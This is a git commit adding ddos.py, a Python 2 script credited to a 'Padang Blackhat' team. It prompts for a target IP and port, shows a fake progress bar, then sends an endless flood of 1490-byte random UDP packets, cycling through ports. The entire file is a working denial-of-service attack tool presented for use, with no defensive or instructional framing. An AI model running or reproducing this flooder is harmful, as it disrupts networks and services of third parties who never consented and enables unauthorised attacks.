0ed1edf3d7f361187c0c00c1fa69ce66fd241038
Emperror7 <137810843+Emperror7@users.noreply.github.com>
2023-07-07 00:13:04 +0700

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,41 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+#Banner End
+print "\255[1;40mAuthor    : Lutfifakee\255[1;40m "
+print "\255[1;40mTEam      : Padang Blackhat\255[1;40m "
+print "\255[1;40mGithub    : https://github.com/Emperror7\255[1;40m "
+print     
+ip = raw_input("[*]Enter Target Ip : ")
+port = int(raw_input("[*]Enter Target Port : "))
+
+time.sleep(3)
+print "[-------->           ] 45%"
+time.sleep(3)
+print "[------------>       ] 55%"
+time.sleep(3)
+print "[------------------->] 100%"
+time.sleep(5)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
